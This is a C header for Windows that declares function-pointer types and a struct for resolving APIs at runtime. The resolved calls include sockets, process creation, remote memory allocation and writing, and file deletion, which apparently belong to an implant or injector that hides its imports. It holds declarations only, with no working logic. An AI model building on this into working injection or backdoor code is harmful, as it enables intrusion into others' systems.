#pragma once
#include <Windows.h>
#include <shlobj_core.h>
#include <TlHelp32.h>
#include <wininet.h>
#include <winsock.h>
#include "utils.h"


typedef BOOL(WINAPI* Tconnect)(SOCKET, const SOCKADDR*, int);
typedef BOOL(WINAPI* Tsend)(SOCKET, const char*, int, int);
typedef BOOL(WINAPI* Trecv)(SOCKET, char*, int, int);
typedef BOOL(WINAPI* Tclosesocket)(SOCKET);
typedef u_short(WINAPI* Thtons)(u_short);
typedef u_long(WINAPI* Tinet_addr)(const char*);
typedef SOCKET(WINAPI* Tsocket)(int, int, int);
typedef int(WINAPI* TWSAStartup)(WORD, LPWSADATA);
typedef int(WINAPI* TWSAGetLastError)(void);
typedef int(WINAPI* Tselect)(int, fd_set FAR*, fd_set FAR*, fd_set FAR*, const struct timeval FAR*);
typedef int(WINAPI* Tsetsockopt)(SOCKET, int, int, const char*, int);

typedef void* (WINAPI* Tmemset)(void*, int, size_t);
typedef void* (WINAPI* Tmalloc)(size_t);
typedef void(WINAPI* Tfree)(void*);
typedef int(WINAPI* Tstrncmp)(const char*, const char*, size_t);
typedef size_t(WINAPI* Tmbstowcs)(wchar_t*, const char*, size_t);
typedef char*(WINAPI* Tstrcpy)(char*, const char*);
typedef int(WINAPI* Tremove)(const char*);
typedef int(WINAPI* Trmdir)(const char*);
typedef int(WINAPI* Tstat)(char const* const, struct stat* const);
typedef int(WINAPI* Tsprintf)(char const*, char const* const, ...);
typedef void*(WINAPI* Trealloc)(void*, size_t);
typedef size_t(WINAPI* Twcstombs)(char*, wchar_t const*, size_t);
typedef struct tm* (WINAPI* Tlocaltime)(__time64_t const*);
typedef size_t(WINAPI* Tstrftime)(char*, size_t, char const*, struct tm const*);
typedef int(WINAPI* T_snprintf)(char* const, size_t const, char const* const, ...);
typedef FILE* (WINAPI* Tfopen)(char const*, char const*);
typedef int(WINAPI* Tfclose)(FILE*);
typedef size_t(WINAPI* Tfread)(void*, size_t, size_t, FILE*);
typedef size_t(WINAPI* Tfwrite)(void const*, size_t, size_t, FILE*);
typedef LPWSTR(WINAPI* TlstrcpyW)(LPWSTR, LPCWSTR);
typedef LPWSTR(WINAPI* TlstrcatW)(LPWSTR, LPCWSTR);
typedef int(WINAPI* Twcscmp)(const wchar_t*, const wchar_t*);

typedef HANDLE(WINAPI* TCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* TReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* TWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* TCloseHandle)(HANDLE);
typedef DWORD(WINAPI* TGetLastError)(void);
typedef BOOL(WINAPI* TCreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef BOOL(WINAPI* TWaitForSingleObject)(HANDLE, DWORD);
typedef void(WINAPI* TSleep)(DWORD);
typedef HANDLE(WINAPI* TCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* TTerminateThread)(HANDLE, DWORD);
typedef BOOL(WINAPI* TCreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI* TTerminateProcess)(HANDLE, UINT);
typedef BOOL(WINAPI* TFreeLibrary)(HMODULE);
typedef FARPROC(WINAPI* TGetProcAddress)(HMODULE, LPCSTR);
typedef BOOL(WINAPI* TFindClose)(HANDLE);
typedef DWORD(WINAPI* TGetLogicalDrives)(VOID);
typedef int(WINAPI* TMultiByteToWideChar)(UINT, DWORD, LPCCH, int, LPWSTR, int);
typedef HANDLE(WINAPI* TFindFirstFileW)(LPCWSTR, LPWIN32_FIND_DATAW);
typedef BOOL(WINAPI* TFindNextFileW)(HANDLE, LPWIN32_FIND_DATAW);
typedef BOOL(WINAPI* TRemoveDirectoryW)(LPCWSTR);
typedef BOOL(WINAPI* TDeleteFileW)(LPCWSTR);
typedef HANDLE(WINAPI* TCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI* TProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
typedef HANDLE(WINAPI* TOpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL(WINAPI* TProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL(WINAPI* TIsWow64Process)(HANDLE, PBOOL);
typedef BOOL(WINAPI* TWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef LPVOID(WINAPI* TVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef DWORD(WINAPI* TSetFilePointer)(HANDLE, LONG, PLONG, DWORD);
typedef BOOL(WINAPI* TGetFileSizeEx)(HANDLE, PLARGE_INTEGER);

typedef struct ApiList {
	Tconnect connect;
	Tsocket socket;
	Tsend send;
	Trecv recv;
	Tclosesocket closesocket;
	Thtons htons;
	Tinet_addr inet_addr;
	TWSAStartup WSAStartup;
	TWSAGetLastError WSAGetLastError;
	Tselect select;
	Tsetsockopt setsockopt;

	Tmemset memset;
	Tmalloc malloc;
	Tfree free;
	Tstrncmp strncmp;

	TCreateFileW CreateFileW;
	TReadFile ReadFile;
	TWriteFile WriteFile;
	TCloseHandle CloseHandle;
	TGetLastError GetLastError;
	TCreatePipe CreatePipe;
	TWaitForSingleObject WaitForSingleObject;
	TSleep Sleep;
	TCreateThread CreateThread;
	TTerminateThread TerminateThread;
	TCreateProcessW CreateProcessW;
	TTerminateProcess TerminateProcess;
	TFreeLibrary FreeLibrary;
	TGetProcAddress GetProcAddress;
	TFindClose FindClose;
	TGetLogicalDrives GetLogicalDrives;
	TMultiByteToWideChar MultiByteToWideChar;
	TFindFirstFileW FindFirstFileW;
	TFindNextFileW FindNextFileW;
	TRemoveDirectoryW RemoveDirectoryW;
	TDeleteFileW DeleteFileW;
	TCreateToolhelp32Snapshot CreateToolhelp32Snapshot;
	TProcess32FirstW Process32FirstW;
	TOpenProcess OpenProcess;
	TProcess32NextW Process32NextW;
	TIsWow64Process IsWow64Process;
	TWriteProcessMemory WriteProcessMemory;
	TVirtualAllocEx VirtualAllocEx;
	TSetFilePointer SetFilePointer;
	TGetFileSizeEx GetFileSizeEx;

	Tmbstowcs mbstowcs;
	Twcstombs wcstombs;
	Tstrcpy strcpy;
	Tremove remove;
	Trmdir rmdir;
	Tstat stat;
	Tsprintf sprintf;
	Trealloc realloc;
	Tlocaltime localtime;
	Tstrftime strftime;
	T_snprintf _snprintf;
	Tfopen fopen;
	Tfclose fclose;
	Tfread fread;
	Tfwrite fwrite;
	TlstrcpyW lstrcpyW;
	TlstrcatW lstrcatW;
	Twcscmp wcscmp;
} API;

void InitApis();
//void FreeApis(); Never called